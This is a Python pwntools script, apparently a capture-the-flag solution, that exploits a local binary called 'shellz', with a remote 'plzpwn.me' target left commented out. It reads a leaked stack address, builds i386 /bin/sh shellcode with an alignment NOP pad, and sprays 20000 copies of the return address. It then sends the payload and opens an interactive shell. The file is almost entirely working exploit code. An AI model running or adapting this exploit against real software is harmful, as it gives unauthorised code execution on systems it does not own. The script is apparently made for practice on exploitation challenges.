#!/usr/bin/python3

from binascii import unhexlify
from pwn import *
from math import *

PROGRAM_NAME = "sh"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16

def io_beg():
	return process("./shellz")
	#process("./simple")
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("Here is a random stack address:".encode(ENCODING), timeout = 3).decode(ENCODING)

def main():
	print("**********WELCOME**********")
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			print("Cooking")
			
			io = io_beg()						
			io_rdy(io)
			
			addr = io.recvline().decode(ENCODING)
			addr = addr.strip().split("x")[-1]
			
			addr_int = int(addr, 16)
			addr_mod4 = addr_int % 4
			
			print("addr: "+addr)
			print("addr_mod4: "+str(addr_mod4))
			
			
			stage = stage + 1
		elif(stage == 1):
			part1 = asm(shellcraft.i386.linux.sh())
			part1_len = len(part1)
			part1_mod4 = part1_len % 4
			print("part1_len & mod: "+str(part1_len)+" "+str(part1_mod4))
			
			part2_block =  asm(pwnlib.shellcraft.i386.nop())
			assert (len(part2_block) == 1)
			part2_len = ((part1_mod4+addr_mod4) % 4)+4
			part2 = part2_block*part2_len
			print("part2_len "+str(part2_len))
			
			part3_block = p32(addr_int)
			part3_len = 20000 # to be sure
			part3 = part3_block*part3_len
			
			stage = stage + 1
		elif(stage == 2):
			sleep(1)
			
			print("1. Deploying parts")
			print("* Part 1 ("+str(len(part1))+")")
			io.send_raw(part1) # win
			print("* Part 2 ("+str(len(part2))+")")
			io.send_raw(part2) # win
			print("* Part 3 ("+str(len(part3))+")")
			io.send_raw(part3) # win

			print("2. Fire")
			#io.sendline(b'') # fire!		
			
			io.interactive()
			
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
